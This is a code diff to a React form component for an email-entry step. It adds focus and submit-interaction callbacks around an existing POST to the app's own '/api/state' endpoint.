@@ -12,27 +12,34 @@ const emailSchema = z.object({
 });
 type EmailFormData = z.infer<typeof emailSchema>;
 
-export default function EmailStep() {
+type EmailStepProps = {
+  onInteractionStart: () => void;
+  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
+};
+
+export default function EmailStep({ onInteractionStart, onInteractionEnd }: EmailStepProps) {
   const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<EmailFormData>({
     resolver: zodResolver(emailSchema),
   });
   const { toast } = useToast();
 
   const onSubmit: SubmitHandler<EmailFormData> = async (data) => {
-    try {
-      const res = await fetch("/api/state", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "submitEmail", email: data.email }),
-      });
-      if (!res.ok) throw new Error("Server responded with an error.");
-    } catch (error) {
-      toast({
-        variant: "destructive",
-        title: "Error",
-        description: "Could not proceed. Please try again.",
-      });
-    }
+    await onInteractionEnd(async () => {
+      try {
+        const res = await fetch("/api/state", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "submitEmail", email: data.email }),
+        });
+        if (!res.ok) throw new Error("Server responded with an error.");
+      } catch (error) {
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Could not proceed. Please try again.",
+        });
+      }
+    });
   };
 
   return (
@@ -48,6 +55,7 @@ export default function EmailStep() {
             placeholder="Email or phone"
             {...register("email")}
             className="h-14 pt-2 text-base"
+            onFocus={onInteractionStart}
           />
           {errors.email && <p className="text-sm text-destructive mt-1 px-1">{errors.email.message}</p>}
         </div>
